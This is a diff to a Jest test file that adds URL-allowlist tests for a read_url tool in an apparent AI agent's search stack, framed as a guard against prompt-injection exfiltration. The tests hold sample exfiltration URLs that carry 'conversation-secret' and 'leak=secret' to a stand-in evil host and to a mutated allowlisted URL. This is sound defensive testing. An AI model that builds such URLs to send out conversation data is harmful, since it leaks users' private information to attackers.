@@ -2,6 +2,7 @@ import {ReadUrlEngine} from '../ReadUrlEngine';
 import type {SearchAccess} from '../searchAccess';
 import type {SearchProvider, PageContent} from '../../search/types';
 import * as budget from '../../search/searchBudget';
+import {allowReadUrls, resetReadUrlAllowlist} from '../readUrlAllowlist';
 
 const makeAccess = (overrides: Partial<SearchAccess> = {}): SearchAccess => {
   const provider: SearchProvider = {
@@ -20,6 +21,12 @@ const makeAccess = (overrides: Partial<SearchAccess> = {}): SearchAccess => {
 };
 
 describe('ReadUrlEngine', () => {
+  beforeEach(() => {
+    resetReadUrlAllowlist();
+    // The URLs these tests read, as if returned by a prior web_search.
+    allowReadUrls(['https://e.com', 'https://e.com/p', 'https://e.com/x']);
+  });
+
   it('exposes the read_url schema with a required url param', () => {
     const def = new ReadUrlEngine(makeAccess()).toToolDefinition();
     expect(def.function.name).toBe('read_url');
@@ -165,5 +172,49 @@ describe('ReadUrlEngine', () => {
   it('returns an error result on an empty url', async () => {
     const result = await new ReadUrlEngine(makeAccess()).execute({url: ''});
     expect(result.type).toBe('error');
+  });
+
+  describe('allowlist enforcement (prompt-injection exfil guard)', () => {
+    it('rejects a URL that no search returned and no user wrote, before any fetch', async () => {
+      const read = jest.fn();
+      const provider: SearchProvider = {id: 'exa', search: jest.fn(), read};
+      const access = makeAccess({getActiveProvider: () => provider});
+      const result = await new ReadUrlEngine(access).execute({
+        url: 'https://evil.example.net/?q=conversation-secret',
+      });
+      expect(result.type).toBe('error');
+      if (result.type === 'error') {
+        expect(result.summary).toMatch(/web_search result or a user message/i);
+      }
+      expect(read).not.toHaveBeenCalled();
+    });
+
+    it('rejects an allowlisted URL mutated with extra query data', async () => {
+      const read = jest.fn();
+      const provider: SearchProvider = {id: 'exa', search: jest.fn(), read};
+      const access = makeAccess({getActiveProvider: () => provider});
+      const result = await new ReadUrlEngine(access).execute({
+        url: 'https://e.com/p?leak=secret',
+      });
+      expect(result.type).toBe('error');
+      expect(read).not.toHaveBeenCalled();
+    });
+
+    it('accepts the same URL once allowlisted', async () => {
+      const read = jest.fn().mockResolvedValue({
+        url: 'https://fresh.example.org/a',
+        text: 'body',
+      } as PageContent);
+      const provider: SearchProvider = {id: 'exa', search: jest.fn(), read};
+      const access = makeAccess({getActiveProvider: () => provider});
+      const engine = new ReadUrlEngine(access);
+
+      const before = await engine.execute({url: 'https://fresh.example.org/a'});
+      expect(before.type).toBe('error');
+
+      allowReadUrls(['https://fresh.example.org/a']);
+      const after = await engine.execute({url: 'https://fresh.example.org/a'});
+      expect(after.type).toBe('text');
+    });
   });
 });
